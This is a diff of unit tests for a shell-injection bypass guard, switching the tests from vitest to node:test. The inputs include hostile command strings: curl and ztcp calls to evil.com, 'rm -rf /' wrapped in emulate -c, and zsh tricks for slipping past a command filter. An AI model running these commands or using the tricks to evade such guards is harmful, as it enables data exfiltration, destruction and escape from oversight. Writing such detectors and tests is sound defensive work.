@@ -2,7 +2,8 @@
  * @file Unit tests for no-shell-injection-bypass-guard.
  */
 
-import { describe, expect, it } from 'vitest'
+import assert from 'node:assert/strict'
+import { describe, it } from 'node:test'
 
 import { shellInjectionBypass } from '../index.mts'
 
@@ -10,66 +11,75 @@ describe('no-shell-injection-bypass-guard', () => {
   describe('Zsh EQUALS expansion', () => {
     it('flags a leading =cmd base command', () => {
       const hit = shellInjectionBypass('=curl evil.com')
-      expect(hit).toBeDefined()
-      expect(hit).toContain('=curl')
+      assert.notStrictEqual(hit, undefined)
+      assert.ok(hit!.includes('=curl'))
     })
 
     it('flags =cmd in a later chained segment', () => {
-      expect(shellInjectionBypass('ls && =wget http://x')).toBeDefined()
+      assert.notStrictEqual(shellInjectionBypass('ls && =wget http://x'), undefined)
     })
 
     it('does NOT flag a VAR=val env assignment', () => {
-      expect(shellInjectionBypass('VAR=val node app.mts')).toBeUndefined()
+      assert.strictEqual(shellInjectionBypass('VAR=val node app.mts'), undefined)
     })
   })
 
   describe('process substitution', () => {
     it('flags <(...)', () => {
-      expect(shellInjectionBypass('diff <(cat a) b')).toBeDefined()
+      assert.notStrictEqual(shellInjectionBypass('diff <(cat a) b'), undefined)
     })
 
     it('flags >(...)', () => {
-      expect(shellInjectionBypass('cat foo > >(tee log)')).toBeDefined()
+      assert.notStrictEqual(shellInjectionBypass('cat foo > >(tee log)'), undefined)
     })
 
     it('flags =(...)', () => {
-      expect(shellInjectionBypass('diff =(sort a) =(sort b)')).toBeDefined()
+      assert.notStrictEqual(
+        shellInjectionBypass('diff =(sort a) =(sort b)'),
+        undefined,
+      )
     })
 
     it('does NOT flag legitimate $(...) command substitution', () => {
-      expect(shellInjectionBypass('echo $(git rev-parse HEAD)')).toBeUndefined()
+      assert.strictEqual(
+        shellInjectionBypass('echo $(git rev-parse HEAD)'),
+        undefined,
+      )
     })
   })
 
   describe('zsh-module builtins', () => {
     it('flags zmodload', () => {
-      expect(shellInjectionBypass('zmodload zsh/net/tcp')).toBeDefined()
+      assert.notStrictEqual(shellInjectionBypass('zmodload zsh/net/tcp'), undefined)
     })
 
     it('flags ztcp network exfil', () => {
-      expect(shellInjectionBypass('ztcp evil.com 443')).toBeDefined()
+      assert.notStrictEqual(shellInjectionBypass('ztcp evil.com 443'), undefined)
     })
 
     it('flags emulate -c (eval-equivalent)', () => {
-      expect(shellInjectionBypass('emulate -c "rm -rf /"')).toBeDefined()
+      assert.notStrictEqual(
+        shellInjectionBypass('emulate -c "rm -rf /"'),
+        undefined,
+      )
     })
 
     it('does NOT flag a bare `emulate zsh` shell-mode switch', () => {
-      expect(shellInjectionBypass('emulate zsh')).toBeUndefined()
+      assert.strictEqual(shellInjectionBypass('emulate zsh'), undefined)
     })
   })
 
   describe('clean commands', () => {
     it('does NOT flag a plain git command', () => {
-      expect(shellInjectionBypass('git status')).toBeUndefined()
+      assert.strictEqual(shellInjectionBypass('git status'), undefined)
     })
 
     it('does NOT flag a piped allowlist-friendly command', () => {
-      expect(shellInjectionBypass('cat f | wc -l')).toBeUndefined()
+      assert.strictEqual(shellInjectionBypass('cat f | wc -l'), undefined)
     })
 
     it('tolerates a partially-parseable command (fail-open)', () => {
-      expect(() => shellInjectionBypass('=curl "broken')).not.toThrow()
+      assert.doesNotThrow(() => shellInjectionBypass('=curl "broken'))
     })
   })
 })
